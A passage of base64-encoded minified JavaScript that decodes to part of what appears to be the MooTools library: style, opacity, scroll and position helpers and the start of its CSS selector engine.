jdXJyZW50U3R5bGUuaGFzTGF5b3V0KXt0aGlzLnN0eWxlLnpvb209MTt9aWYoQnJvd3Nlci5FbmdpbmUudHJpZGVudCl7dGhpcy5zdHlsZS5maWx0ZXI9KGE9PTEpPyIiOiJhbHBoYShvcGFjaXR5PSIrYSoxMDArIikiOwp9dGhpcy5zdHlsZS5vcGFjaXR5PWE7dGhpcy5zdG9yZSgib3BhY2l0eSIsYSk7fSxnZXQ6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5yZXRyaWV2ZSgib3BhY2l0eSIsMSk7fX07RWxlbWVudC5pbXBsZW1lbnQoe3NldE9wYWNpdHk6ZnVuY3Rpb24oYSl7cmV0dXJuIHRoaXMuc2V0KCJvcGFjaXR5IixhLHRydWUpOwp9LGdldE9wYWNpdHk6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5nZXQoIm9wYWNpdHkiKTt9LHNldFN0eWxlOmZ1bmN0aW9uKGIsYSl7c3dpdGNoKGIpe2Nhc2Uib3BhY2l0eSI6cmV0dXJuIHRoaXMuc2V0KCJvcGFjaXR5IixwYXJzZUZsb2F0KGEpKTtjYXNlImZsb2F0IjpiPShCcm93c2VyLkVuZ2luZS50cmlkZW50KT8ic3R5bGVGbG9hdCI6ImNzc0Zsb2F0IjsKfWI9Yi5jYW1lbENhc2UoKTtpZigkdHlwZShhKSE9InN0cmluZyIpe3ZhciBjPShFbGVtZW50LlN0eWxlcy5nZXQoYil8fCJAIikuc3BsaXQoIiAiKTthPSRzcGxhdChhKS5tYXAoZnVuY3Rpb24oZSxkKXtpZighY1tkXSl7cmV0dXJuIiI7fXJldHVybigkdHlwZShlKT09Im51bWJlciIpP2NbZF0ucmVwbGFjZSgiQCIsTWF0aC5yb3VuZChlKSk6ZTsKfSkuam9pbigiICIpO31lbHNle2lmKGE9PVN0cmluZyhOdW1iZXIoYSkpKXthPU1hdGgucm91bmQoYSk7fX10aGlzLnN0eWxlW2JdPWE7cmV0dXJuIHRoaXM7fSxnZXRTdHlsZTpmdW5jdGlvbihnKXtzd2l0Y2goZyl7Y2FzZSJvcGFjaXR5IjpyZXR1cm4gdGhpcy5nZXQoIm9wYWNpdHkiKTsKY2FzZSJmbG9hdCI6Zz0oQnJvd3Nlci5FbmdpbmUudHJpZGVudCk/InN0eWxlRmxvYXQiOiJjc3NGbG9hdCI7fWc9Zy5jYW1lbENhc2UoKTt2YXIgYT10aGlzLnN0eWxlW2ddO2lmKCEkY2hrKGEpKXthPVtdO2Zvcih2YXIgZiBpbiBFbGVtZW50LlNob3J0U3R5bGVzKXtpZihnIT1mKXtjb250aW51ZTsKfWZvcih2YXIgZSBpbiBFbGVtZW50LlNob3J0U3R5bGVzW2ZdKXthLnB1c2godGhpcy5nZXRTdHlsZShlKSk7fXJldHVybiBhLmpvaW4oIiAiKTt9YT10aGlzLmdldENvbXB1dGVkU3R5bGUoZyk7fWlmKGEpe2E9U3RyaW5nKGEpO3ZhciBjPWEubWF0Y2goL3JnYmE/XChbXGRccyxdK1wpLyk7CmlmKGMpe2E9YS5yZXBsYWNlKGNbMF0sY1swXS5yZ2JUb0hleCgpKTt9fWlmKEJyb3dzZXIuRW5naW5lLnByZXN0b3x8KEJyb3dzZXIuRW5naW5lLnRyaWRlbnQmJiEkY2hrKHBhcnNlSW50KGEsMTApKSkpe2lmKGcudGVzdCgvXihoZWlnaHR8d2lkdGgpJC8pKXt2YXIgYj0oZz09IndpZHRoIik/WyJsZWZ0IiwicmlnaHQiXTpbInRvcCIsImJvdHRvbSJdLGQ9MDsKYi5lYWNoKGZ1bmN0aW9uKGgpe2QrPXRoaXMuZ2V0U3R5bGUoImJvcmRlci0iK2grIi13aWR0aCIpLnRvSW50KCkrdGhpcy5nZXRTdHlsZSgicGFkZGluZy0iK2gpLnRvSW50KCk7fSx0aGlzKTtyZXR1cm4gdGhpc1sib2Zmc2V0IitnLmNhcGl0YWxpemUoKV0tZCsicHgiOwp9aWYoKEJyb3dzZXIuRW5naW5lLnByZXN0bykmJlN0cmluZyhhKS50ZXN0KCJweCIpKXtyZXR1cm4gYTt9aWYoZy50ZXN0KC8oYm9yZGVyKC4rKVdpZHRofG1hcmdpbnxwYWRkaW5nKS8pKXtyZXR1cm4iMHB4Ijt9fXJldHVybiBhO30sc2V0U3R5bGVzOmZ1bmN0aW9uKGIpe2Zvcih2YXIgYSBpbiBiKXt0aGlzLnNldFN0eWxlKGEsYlthXSk7Cn1yZXR1cm4gdGhpczt9LGdldFN0eWxlczpmdW5jdGlvbigpe3ZhciBhPXt9O0FycmF5LmVhY2goYXJndW1lbnRzLGZ1bmN0aW9uKGIpe2FbYl09dGhpcy5nZXRTdHlsZShiKTt9LHRoaXMpO3JldHVybiBhO319KTtFbGVtZW50LlN0eWxlcz1uZXcgSGFzaCh7bGVmdDoiQHB4Iix0b3A6IkBweCIsYm90dG9tOiJAcHgiLHJpZ2h0OiJAcHgiLHdpZHRoOiJAcHgiLGhlaWdodDoiQHB4IixtYXhXaWR0aDoiQHB4IixtYXhIZWlnaHQ6IkBweCIsbWluV2lkdGg6IkBweCIsbWluSGVpZ2h0OiJAcHgiLGJhY2tncm91bmRDb2xvcjoicmdiKEAsIEAsIEApIixiYWNrZ3JvdW5kUG9zaXRpb246IkBweCBAcHgiLGNvbG9yOiJyZ2IoQCwgQCwgQCkiLGZvbnRTaXplOiJAcHgiLGxldHRlclNwYWNpbmc6IkBweCIsbGluZUhlaWdodDoiQHB4IixjbGlwOiJyZWN0KEBweCBAcHggQHB4IEBweCkiLG1hcmdpbjoiQHB4IEBweCBAcHggQHB4IixwYWRkaW5nOiJAcHggQHB4IEBweCBAcHgiLGJvcmRlcjoiQHB4IEAgcmdiKEAsIEAsIEApIEBweCBAIHJnYihALCBALCBAKSBAcHggQCByZ2IoQCwgQCwgQCkiLGJvcmRlcldpZHRoOiJAcHggQHB4IEBweCBAcHgiLGJvcmRlclN0eWxlOiJAIEAgQCBAIixib3JkZXJDb2xvcjoicmdiKEAsIEAsIEApIHJnYihALCBALCBAKSByZ2IoQCwgQCwgQCkgcmdiKEAsIEAsIEApIix6SW5kZXg6IkAiLHpvb206IkAiLGZvbnRXZWlnaHQ6IkAiLHRleHRJbmRlbnQ6IkBweCIsb3BhY2l0eToiQCJ9KTsKRWxlbWVudC5TaG9ydFN0eWxlcz17bWFyZ2luOnt9LHBhZGRpbmc6e30sYm9yZGVyOnt9LGJvcmRlcldpZHRoOnt9LGJvcmRlclN0eWxlOnt9LGJvcmRlckNvbG9yOnt9fTtbIlRvcCIsIlJpZ2h0IiwiQm90dG9tIiwiTGVmdCJdLmVhY2goZnVuY3Rpb24oZyl7dmFyIGY9RWxlbWVudC5TaG9ydFN0eWxlczsKdmFyIGI9RWxlbWVudC5TdHlsZXM7WyJtYXJnaW4iLCJwYWRkaW5nIl0uZWFjaChmdW5jdGlvbihoKXt2YXIgaT1oK2c7ZltoXVtpXT1iW2ldPSJAcHgiO30pO3ZhciBlPSJib3JkZXIiK2c7Zi5ib3JkZXJbZV09YltlXT0iQHB4IEAgcmdiKEAsIEAsIEApIjt2YXIgZD1lKyJXaWR0aCIsYT1lKyJTdHlsZSIsYz1lKyJDb2xvciI7CmZbZV09e307Zi5ib3JkZXJXaWR0aFtkXT1mW2VdW2RdPWJbZF09IkBweCI7Zi5ib3JkZXJTdHlsZVthXT1mW2VdW2FdPWJbYV09IkAiO2YuYm9yZGVyQ29sb3JbY109ZltlXVtjXT1iW2NdPSJyZ2IoQCwgQCwgQCkiO30pOyhmdW5jdGlvbigpe0VsZW1lbnQuaW1wbGVtZW50KHtzY3JvbGxUbzpmdW5jdGlvbihoLGkpe2lmKGIodGhpcykpe3RoaXMuZ2V0V2luZG93KCkuc2Nyb2xsVG8oaCxpKTsKfWVsc2V7dGhpcy5zY3JvbGxMZWZ0PWg7dGhpcy5zY3JvbGxUb3A9aTt9cmV0dXJuIHRoaXM7fSxnZXRTaXplOmZ1bmN0aW9uKCl7aWYoYih0aGlzKSl7cmV0dXJuIHRoaXMuZ2V0V2luZG93KCkuZ2V0U2l6ZSgpO31yZXR1cm57eDp0aGlzLm9mZnNldFdpZHRoLHk6dGhpcy5vZmZzZXRIZWlnaHR9Owp9LGdldFNjcm9sbFNpemU6ZnVuY3Rpb24oKXtpZihiKHRoaXMpKXtyZXR1cm4gdGhpcy5nZXRXaW5kb3coKS5nZXRTY3JvbGxTaXplKCk7fXJldHVybnt4OnRoaXMuc2Nyb2xsV2lkdGgseTp0aGlzLnNjcm9sbEhlaWdodH07fSxnZXRTY3JvbGw6ZnVuY3Rpb24oKXtpZihiKHRoaXMpKXtyZXR1cm4gdGhpcy5nZXRXaW5kb3coKS5nZXRTY3JvbGwoKTsKfXJldHVybnt4OnRoaXMuc2Nyb2xsTGVmdCx5OnRoaXMuc2Nyb2xsVG9wfTt9LGdldFNjcm9sbHM6ZnVuY3Rpb24oKXt2YXIgaT10aGlzLGg9e3g6MCx5OjB9O3doaWxlKGkmJiFiKGkpKXtoLngrPWkuc2Nyb2xsTGVmdDtoLnkrPWkuc2Nyb2xsVG9wO2k9aS5wYXJlbnROb2RlOwp9cmV0dXJuIGg7fSxnZXRPZmZzZXRQYXJlbnQ6ZnVuY3Rpb24oKXt2YXIgaD10aGlzO2lmKGIoaCkpe3JldHVybiBudWxsO31pZighQnJvd3Nlci5FbmdpbmUudHJpZGVudCl7cmV0dXJuIGgub2Zmc2V0UGFyZW50O313aGlsZSgoaD1oLnBhcmVudE5vZGUpJiYhYihoKSl7aWYoZChoLCJwb3NpdGlvbiIpIT0ic3RhdGljIil7cmV0dXJuIGg7Cn19cmV0dXJuIG51bGw7fSxnZXRPZmZzZXRzOmZ1bmN0aW9uKCl7aWYoQnJvd3Nlci5FbmdpbmUudHJpZGVudCl7dmFyIGw9dGhpcy5nZXRCb3VuZGluZ0NsaWVudFJlY3QoKSxqPXRoaXMuZ2V0RG9jdW1lbnQoKS5kb2N1bWVudEVsZW1lbnQ7dmFyIG09ZCh0aGlzLCJwb3NpdGlvbiIpPT0iZml4ZWQiOwpyZXR1cm57eDpsLmxlZnQrKChtKT8wOmouc2Nyb2xsTGVmdCktai5jbGllbnRMZWZ0LHk6bC50b3ArKChtKT8wOmouc2Nyb2xsVG9wKS1qLmNsaWVudFRvcH07fXZhciBpPXRoaXMsaD17eDowLHk6MH07aWYoYih0aGlzKSl7cmV0dXJuIGg7fXdoaWxlKGkmJiFiKGkpKXtoLngrPWkub2Zmc2V0TGVmdDsKaC55Kz1pLm9mZnNldFRvcDtpZihCcm93c2VyLkVuZ2luZS5nZWNrbyl7aWYoIWYoaSkpe2gueCs9YyhpKTtoLnkrPWcoaSk7fXZhciBrPWkucGFyZW50Tm9kZTtpZihrJiZkKGssIm92ZXJmbG93IikhPSJ2aXNpYmxlIil7aC54Kz1jKGspO2gueSs9ZyhrKTt9fWVsc2V7aWYoaSE9dGhpcyYmQnJvd3Nlci5FbmdpbmUud2Via2l0KXtoLngrPWMoaSk7CmgueSs9ZyhpKTt9fWk9aS5vZmZzZXRQYXJlbnQ7fWlmKEJyb3dzZXIuRW5naW5lLmdlY2tvJiYhZih0aGlzKSl7aC54LT1jKHRoaXMpO2gueS09Zyh0aGlzKTt9cmV0dXJuIGg7fSxnZXRQb3NpdGlvbjpmdW5jdGlvbihrKXtpZihiKHRoaXMpKXtyZXR1cm57eDowLHk6MH07Cn12YXIgbD10aGlzLmdldE9mZnNldHMoKSxpPXRoaXMuZ2V0U2Nyb2xscygpO3ZhciBoPXt4OmwueC1pLngseTpsLnktaS55fTt2YXIgaj0oayYmKGs9JChrKSkpP2suZ2V0UG9zaXRpb24oKTp7eDowLHk6MH07cmV0dXJue3g6aC54LWoueCx5OmgueS1qLnl9O30sZ2V0Q29vcmRpbmF0ZXM6ZnVuY3Rpb24oail7aWYoYih0aGlzKSl7cmV0dXJuIHRoaXMuZ2V0V2luZG93KCkuZ2V0Q29vcmRpbmF0ZXMoKTsKfXZhciBoPXRoaXMuZ2V0UG9zaXRpb24oaiksaT10aGlzLmdldFNpemUoKTt2YXIgaz17bGVmdDpoLngsdG9wOmgueSx3aWR0aDppLngsaGVpZ2h0OmkueX07ay5yaWdodD1rLmxlZnQray53aWR0aDtrLmJvdHRvbT1rLnRvcCtrLmhlaWdodDtyZXR1cm4gazt9LGNvbXB1dGVQb3NpdGlvbjpmdW5jdGlvbihoKXtyZXR1cm57bGVmdDpoLngtZSh0aGlzLCJtYXJnaW4tbGVmdCIpLHRvcDpoLnktZSh0aGlzLCJtYXJnaW4tdG9wIil9Owp9LHBvc2l0aW9uOmZ1bmN0aW9uKGgpe3JldHVybiB0aGlzLnNldFN0eWxlcyh0aGlzLmNvbXB1dGVQb3NpdGlvbihoKSk7fX0pO05hdGl2ZS5pbXBsZW1lbnQoW0RvY3VtZW50LFdpbmRvd10se2dldFNpemU6ZnVuY3Rpb24oKXtpZihCcm93c2VyLkVuZ2luZS5wcmVzdG98fEJyb3dzZXIuRW5naW5lLndlYmtpdCl7dmFyIGk9dGhpcy5nZXRXaW5kb3coKTsKcmV0dXJue3g6aS5pbm5lcldpZHRoLHk6aS5pbm5lckhlaWdodH07fXZhciBoPWEodGhpcyk7cmV0dXJue3g6aC5jbGllbnRXaWR0aCx5OmguY2xpZW50SGVpZ2h0fTt9LGdldFNjcm9sbDpmdW5jdGlvbigpe3ZhciBpPXRoaXMuZ2V0V2luZG93KCksaD1hKHRoaXMpOwpyZXR1cm57eDppLnBhZ2VYT2Zmc2V0fHxoLnNjcm9sbExlZnQseTppLnBhZ2VZT2Zmc2V0fHxoLnNjcm9sbFRvcH07fSxnZXRTY3JvbGxTaXplOmZ1bmN0aW9uKCl7dmFyIGk9YSh0aGlzKSxoPXRoaXMuZ2V0U2l6ZSgpO3JldHVybnt4Ok1hdGgubWF4KGkuc2Nyb2xsV2lkdGgsaC54KSx5Ok1hdGgubWF4KGkuc2Nyb2xsSGVpZ2h0LGgueSl9Owp9LGdldFBvc2l0aW9uOmZ1bmN0aW9uKCl7cmV0dXJue3g6MCx5OjB9O30sZ2V0Q29vcmRpbmF0ZXM6ZnVuY3Rpb24oKXt2YXIgaD10aGlzLmdldFNpemUoKTtyZXR1cm57dG9wOjAsbGVmdDowLGJvdHRvbTpoLnkscmlnaHQ6aC54LGhlaWdodDpoLnksd2lkdGg6aC54fTsKfX0pO3ZhciBkPUVsZW1lbnQuZ2V0Q29tcHV0ZWRTdHlsZTtmdW5jdGlvbiBlKGgsaSl7cmV0dXJuIGQoaCxpKS50b0ludCgpfHwwO31mdW5jdGlvbiBmKGgpe3JldHVybiBkKGgsIi1tb3otYm94LXNpemluZyIpPT0iYm9yZGVyLWJveCI7fWZ1bmN0aW9uIGcoaCl7cmV0dXJuIGUoaCwiYm9yZGVyLXRvcC13aWR0aCIpOwp9ZnVuY3Rpb24gYyhoKXtyZXR1cm4gZShoLCJib3JkZXItbGVmdC13aWR0aCIpO31mdW5jdGlvbiBiKGgpe3JldHVybigvXig/OmJvZHl8aHRtbCkkL2kpLnRlc3QoaC50YWdOYW1lKTt9ZnVuY3Rpb24gYShoKXt2YXIgaT1oLmdldERvY3VtZW50KCk7cmV0dXJuKCFpLmNvbXBhdE1vZGV8fGkuY29tcGF0TW9kZT09IkNTUzFDb21wYXQiKT9pLmh0bWw6aS5ib2R5Owp9fSkoKTtOYXRpdmUuaW1wbGVtZW50KFtXaW5kb3csRG9jdW1lbnQsRWxlbWVudF0se2dldEhlaWdodDpmdW5jdGlvbigpe3JldHVybiB0aGlzLmdldFNpemUoKS55O30sZ2V0V2lkdGg6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5nZXRTaXplKCkueDt9LGdldFNjcm9sbFRvcDpmdW5jdGlvbigpe3JldHVybiB0aGlzLmdldFNjcm9sbCgpLnk7Cn0sZ2V0U2Nyb2xsTGVmdDpmdW5jdGlvbigpe3JldHVybiB0aGlzLmdldFNjcm9sbCgpLng7fSxnZXRTY3JvbGxIZWlnaHQ6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5nZXRTY3JvbGxTaXplKCkueTt9LGdldFNjcm9sbFdpZHRoOmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuZ2V0U2Nyb2xsU2l6ZSgpLng7Cn0sZ2V0VG9wOmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuZ2V0UG9zaXRpb24oKS55O30sZ2V0TGVmdDpmdW5jdGlvbigpe3JldHVybiB0aGlzLmdldFBvc2l0aW9uKCkueDt9fSk7TmF0aXZlLmltcGxlbWVudChbRG9jdW1lbnQsRWxlbWVudF0se2dldEVsZW1lbnRzOmZ1bmN0aW9uKGgsZyl7aD1oLnNwbGl0KCIsIik7CnZhciBjLGU9e307Zm9yKHZhciBkPTAsYj1oLmxlbmd0aDtkPGI7ZCsrKXt2YXIgYT1oW2RdLGY9U2VsZWN0b3JzLlV0aWxzLnNlYXJjaCh0aGlzLGEsZSk7aWYoZCE9MCYmZi5pdGVtKXtmPSRBKGYpO31jPShkPT0wKT9mOihjLml0ZW0pPyRBKGMpLmNvbmNhdChmKTpjLmNvbmNhdChmKTsKfXJldHVybiBuZXcgRWxlbWVudHMoYyx7ZGR1cDooaC5sZW5ndGg+MSksY2FzaDohZ30pO319KTtFbGVtZW50LmltcGxlbWVudCh7bWF0Y2g6ZnVuY3Rpb24oYil7aWYoIWJ8fChiPT10aGlzKSl7cmV0dXJuIHRydWU7fXZhciBkPVNlbGVjdG9ycy5VdGlscy5wYXJzZVRhZ0FuZElEKGIpOwp2YXIgYT1kWzBdLGU9ZFsxXTtpZighU2VsZWN0b3JzLkZpbHRlcnMuYnlJRCh0aGlzLGUpfHwhU2VsZWN0b3JzLkZpbHRlcnMuYnlUYWcodGhpcyxhKSl7cmV0dXJuIGZhbHNlO312YXIgYz1TZWxlY3RvcnMuVXRpbHMucGFyc2VTZWxlY3RvcihiKTtyZXR1cm4oYyk/U2VsZWN0b3JzLlV0aWxzLmZpbHRlcih0aGlzLGMse30pOnRydWU7Cn19KTt2YXIgU2VsZWN0b3JzPXtDYWNoZTp7bnRoOnt9LHBhcnNlZDp7fX19O1NlbGVjdG9ycy5SZWdFeHBzPXtpZDooLyMoW1x3LV0rKS8pLHRhZzooL14oXHcrfFwqKS8pLHF1aWNrOigvXihcdyt8XCopJC8pLHNwbGl0dGVyOigvXHMqKFsrPn5cc10pXHMqKFthLXpBLVojLio6XFtdKS9nKSxjb21iaW5lZDooL1wuKFtcdy1dKyl8XFsoXHcrKSg/OihbISpeJH58XT89KShbIiddPykoW15cNF0qPylcNCk/XF18OihbXHctXSspKD86XChbIiddPyguKj8pP1siJ10/XCl8JCkvZyl9OwpTZWxlY3RvcnMuVXRpbHM9e2NoazpmdW5jdGlvbihiLGMpe2lmKCFjKXtyZXR1cm4gdHJ1ZTt9dmFyIGE9JHVpZChiKTtpZighY1thXSl7cmV0dXJuIGNbYV09dHJ1ZTt9cmV0dXJuIGZhbHNlO30scGFyc2VOdGhBcmd1bWVudDpmdW5jdGlvbihoKXtpZihTZWxlY3RvcnMuQ2FjaGUubnRoW2hdKXtyZXR1cm4gU2VsZWN0b3JzLkNhY2hlLm50aFtoXTsKfXZhciBlPWgubWF0Y2goL14oWystXT9cZCopPyhbYS16XSspPyhbKy1dP1xkKik/JC8pO2lmKCFlKXtyZXR1cm4gZmFsc2U7fXZhciBnPXBhcnNlSW50KGVbMV0sMTApO3ZhciBkPShnfHxnPT09MCk/ZzoxO3ZhciBmPWVbMl18fGZhbHNlO3ZhciBjPXBhcnNlSW50KGVbM10sMTApfHwwOwppZihkIT0wKXtjLS07d2hpbGUoYzwxKXtjKz1kO313aGlsZShjPj1kKXtjLT1kO319ZWxzZXtkPWM7Zj0iaW5kZXgiO31zd2l0Y2goZil7Y2FzZSJuIjplPXthOmQsYjpjLHNwZWNpYWw6Im4ifTticmVhaztjYXNlIm9kZCI6ZT17YToyLGI6MCxzcGVjaWFsOiJuIn07CmJyZWFrO2Nhc2UiZXZlbiI6ZT17YToyLGI6MSxzcGVjaWFsOiJuIn07YnJlYWs7Y2FzZSJmaXJzdCI6ZT17YTowLHNwZWNpYWw6ImluZGV4In07YnJlYWs7Y2FzZSJsYXN0IjplPXtzcGVjaWFsOiJsYXN0LWNoaWxkIn07YnJlYWs7Y2FzZSJvbmx5IjplPXtzcGVjaWFsOiJvbmx5LWNoaWxkIn07CmJyZWFrO2RlZmF1bHQ6ZT17YTooZC0xKSxzcGVjaWFsOiJpbmRleCJ9O31yZXR1cm4gU2VsZWN0b3JzLkNhY2hlLm50aFtoXT1lO30scGFyc2VTZWxlY3RvcjpmdW5jdGlvbihlKXtpZihTZWxlY3RvcnMuQ2FjaGUucGFyc2VkW2VdKXtyZXR1cm4gU2VsZWN0b3JzLkNhY2hlLnBhcnNlZFtlXTsKfXZhciBkLGg9e2NsYXNzZXM6W10scHNldWRvczpbXSxhdHRyaWJ1dGVzOltdfTt3aGlsZSgoZD1TZWxlY3RvcnMuUmVnRXhwcy5jb21iaW5lZC5leGVjKGUpKSl7dmFyIGk9ZFsxXSxnPWRbMl0sZj1kWzNdLGI9ZFs1XSxjPWRbNl0saj1kWzddO2lmKGkpe2guY2xhc3Nlcy5wdXNoKGkpOwp9ZWxzZXtpZihjKXt2YXIgYT1TZWxlY3RvcnMuUHNldWRvLmdldChjKTtpZihhKXtoLnBzZXVkb3MucHVzaCh7cGFyc2VyOmEsYXJndW1lbnQ6an0pO31lbHNle2guYXR0cmlidXRlcy5wdXNoKHtuYW1lOmMsb3BlcmF0b3I6Ij0iLHZhbHVlOmp9KTt9fWVsc2V7aWYoZyl7aC5hdHRyaWJ1dGVzLnB1c2goe25hbWU6ZyxvcGVyYXRvcjpmLHZhbHVlOmJ9KTsKfX19fWlmKCFoLmNsYXNzZXMubGVuZ3RoKXtkZWxldGUgaC5jbGFzc2VzO31pZighaC5hdHRyaWJ1dGVzLmxlbmd0aCl7ZGVsZXRlIGguYXR0cmlidXRlczt9aWYoIWgucHNldWRvcy5sZW5ndGgpe2RlbGV0ZSBoLnBzZXVkb3M7fWlmKCFoLmNsYXNzZXMmJiFoLmF0dHJpYnV0ZXMmJiFoLnBzZXVkb3Mpe2g9bnVsbDsKfXJldHVybiBTZWxlY3RvcnMuQ2FjaGUucGFyc2VkW2VdPWg7fSxwYXJzZVRhZ0FuZElEOmZ1bmN0aW9uKGIpe3ZhciBhPWIubWF0Y2goU2VsZWN0b3JzLlJlZ0V4cHMudGFnKTt2YXIgYz1iLm1hdGNoKFNlbGVjdG9ycy5SZWdFeHBzLmlkKTtyZXR1cm5bKGEpP2FbMV06IioiLChjKT9jWzFdOmZhbHNlXTsKfSxmaWx0ZXI6ZnVuY3Rpb24oZixjLGUpe3ZhciBkO2lmKGMuY2xhc3Nlcyl7Zm9yKGQ9Yy5jbGFzc2VzLmxlbmd0aDtkLS07ZCl7dmFyIGc9Yy5jbGFzc2VzW2RdO2lmKCFTZWxlY3RvcnMuRmlsdGVycy5ieUNsYXNzKGYsZykpe3JldHVybiBmYWxzZTt9fX1pZihjLmF0dHJpYnV0ZXMpe2ZvcihkPWMuYXR0cmlidXRlcy5sZW5ndGg7CmQtLTtkKXt2YXIgYj1jLmF0dHJpYnV0ZXNbZF07aWYoIVNlbGVjdG9ycy5GaWx0ZXJzLmJ5QXR0cmlidXRlKGYsYi5uYW1lLGIub3BlcmF0b3IsYi52YWx1ZSkpe3JldHVybiBmYWxzZTt9fX1pZihjLnBzZXVkb3Mpe2ZvcihkPWMucHNldWRvcy5sZW5ndGg7ZC0tO2Qpe3ZhciBhPWMucHNldWRvc1tkXTsKaWYoIVNlbGVjdG9ycy5GaWx0ZXJzLmJ5UHNldWRvKGYsYS5wYXJzZXIsYS5hcmd1bWVudCxlKSl7cmV0dXJuIGZhbHNlO319fXJldHVybiB0cnVlO30sZ2V0QnlUYWdBbmRJRDpmdW5jdGlvbihiLGEsZCl7aWYoZCl7dmFyIGM9KGIuZ2V0RWxlbWVudEJ5SWQpP2IuZ2V0RWxlbWVudEJ5SWQoZCx0cnVlKTpFbGVtZW50LmdldEVsZW1lbnRCeUlkKGIsZCx0cnVlKTsKcmV0dXJuKGMmJlNlbGVjdG9ycy5GaWx0ZXJzLmJ5VGFnKGMsYSkpP1tjXTpbXTt9ZWxzZXtyZXR1cm4gYi5nZXRFbGVtZW50c0J5VGFnTmFtZShhKTt9fSxzZWFyY2g6ZnVuY3Rpb24obyxoLHQpe3ZhciBiPVtdO3ZhciBjPWgudHJpbSgpLnJlcGxhY2UoU2VsZWN0b3JzLlJlZ0V4cHMuc3BsaXR0ZXIsZnVuY3Rpb24oayxqLGkpe2IucHVzaChqKTsKcmV0dXJuIjopIitpO30pLnNwbGl0KCI6KSIpO3ZhciBwLGUsQTtmb3IodmFyIHo9MCx2PWMubGVuZ3RoO3o8djt6Kyspe3ZhciB5PWNbel07aWYoej09MCYmU2VsZWN0b3JzLlJlZ0V4cHMucXVpY2sudGVzdCh5KSl7cD1vLmdldEVsZW1lbnRzQnlUYWdOYW1lKHkpOwpjb250aW51ZTt9dmFyIGE9Ylt6LTFdO3ZhciBxPVNlbGVjdG9ycy5VdGlscy5wYXJzZVRhZ0FuZElEKHkpO3ZhciBCPXFbMF0scj1xWzFdO2lmKHo9PTApe3A9U2VsZWN0b3JzLlV0aWxzLmdldEJ5VGFnQW5kSUQobyxCLHIpO31lbHNle3ZhciBkPXt9LGc9W107Zm9yKHZhciB4PTAsdz1wLmxlbmd0aDsKeDx3O3grKyl7Zz1TZWxlY3RvcnMuR2V0dGVyc1thXShnLHBbeF0sQixyLGQpO31wPWc7fXZhciBmPVNlbGVjdG9ycy5VdGlscy5wYXJzZVNlbGVjdG9yKHkpO2lmKGYpe2U9W107Zm9yKHZhciB1PTAscz1wLmxlbmd0aDt1PHM7dSsrKXtBPXBbdV07aWYoU2VsZWN0b3JzLlV0aWxzLmZpbHRlcihBLGYsdCkpe2UucHVzaChBKTsKfX1wPWU7fX1yZXR1cm4gcDt9fTtTZWxlY3RvcnMuR2V0dGVycz17IiAiOmZ1bmN0aW9uKGgsZyxqLGEsZSl7dmFyIGQ9U2VsZWN0b3JzLlV0aWxzLmdldEJ5VGFnQW5kSUQoZyxqLGEpO2Zvcih2YXIgYz0wLGI9ZC5sZW5ndGg7YzxiO2MrKyl7dmFyIGY9ZFtjXTtpZihTZWxlY3RvcnMuVXRpbHMuY2hrKGYsZSkpe2gucHVzaChmKTsKfX1yZXR1cm4gaDt9LCI+IjpmdW5jdGlvbihoLGcsaixhLGYpe3ZhciBjPVNlbGVjdG9ycy5VdGlscy5nZXRCeVRhZ0FuZElEKGcsaixhKTtmb3IodmFyIGU9MCxkPWMubGVuZ3RoO2U8ZDtlKyspe3ZhciBiPWNbZV07aWYoYi5wYXJlbnROb2RlPT1nJiZTZWxlY3RvcnMuVXRpbHMuY2hrKGIsZikpe2gucHVzaChiKTsKfX1yZXR1cm4gaDt9LCIrIjpmdW5jdGlvbihjLGIsYSxlLGQpe3doaWxlKChiPWIubmV4dFNpYmxpbmcpKXtpZihiLm5vZGVUeXBlPT0xKXtpZihTZWxlY3RvcnMuVXRpbHMuY2hrKGIsZCkmJlNlbGVjdG9ycy5GaWx0ZXJzLmJ5VGFnKGIsYSkmJlNlbGVjdG9ycy5GaWx0ZXJzLmJ5SUQoYixlKSl7Yy5wdXNoKGIpOwp9YnJlYWs7fX1yZXR1cm4gYzt9LCJ+IjpmdW5jdGlvbihjLGIsYSxlLGQpe3doaWxlKChiPWIubmV4dFNpYmxpbmcpKXtpZihiLm5vZGVUeXBlPT0xKXtpZighU2VsZWN0b3JzLlV0aWxzLmNoayhiLGQpKXticmVhazt9aWYoU2VsZWN0b3JzLkZpbHRlcnMuYnlUYWcoYixhKSYmU2VsZWN0b3JzLkZpbHRlcnMuYnlJRChiLGUpKXtjLnB1c2goYik7Cn19fXJldHVybiBjO319O1NlbGVjdG9ycy5GaWx0ZXJzPXtieVRhZzpmdW5jdGlvbihiLGEpe3JldHVybihhPT0iKiJ8fChiLnRhZ05hbWUmJmIudGFnTmFtZS50b0xvd2VyQ2FzZSgpPT1hKSk7fSxieUlEOmZ1bmN0aW9uKGEsYil7cmV0dXJuKCFifHwoYS5pZCYmYS5pZD09YikpOwp9LGJ5Q2xhc3M6ZnVuY3Rpb24oYixhKXtyZXR1cm4oYi5jbGFzc05hbWUmJmIuY2xhc3NOYW1lLmNvbnRhaW5zKGEsIiAiKSk7fSxieVBzZXVkbzpmdW5jdGlvbihhLGQsYyxiKXtyZXR1cm4gZC5jYWxsKGEsYyxiKTt9LGJ5QXR0cmlidXRlOmZ1bmN0aW9uKGMsZCxiLGUpe3ZhciBhPUVsZW1lbnQucHJvdG90eXBlLmdldFByb3BlcnR5LmNhbGwoYyxkKTsKaWYoIWEpe3JldHVybihiPT0iIT0iKTt9aWYoIWJ8fGU9PXVuZGVmaW5lZCl7cmV0dXJuIHRydWU7fXN3aXRjaChiKXtjYXNlIj0iOnJldHVybihhPT1lKTtjYXNlIio9IjpyZXR1cm4oYS5jb250YWlucyhlKSk7Y2FzZSJePSI6cmV0dXJuKGEuc3Vic3RyKDAsZS5sZW5ndGgpPT1lKTsKY2FzZSIkPSI6cmV0dXJuKGEuc3Vic3RyKGEubGVuZ3RoLWUubGVuZ3RoKT09ZSk7Y2FzZSIhPSI6cmV0dXJuKGEhPWUpO2Nhc2Uifj0iOnJldHVybiBhLmNvbnRhaW5zKGUsIiAiKTtjYXNlInw9IjpyZXR1cm4gYS5jb250YWlucyhlLCItIik7fXJldHVybiBmYWxzZTsKfX07U2VsZWN0b3JzLlBzZXVkbz1uZXcgSGFzaCh7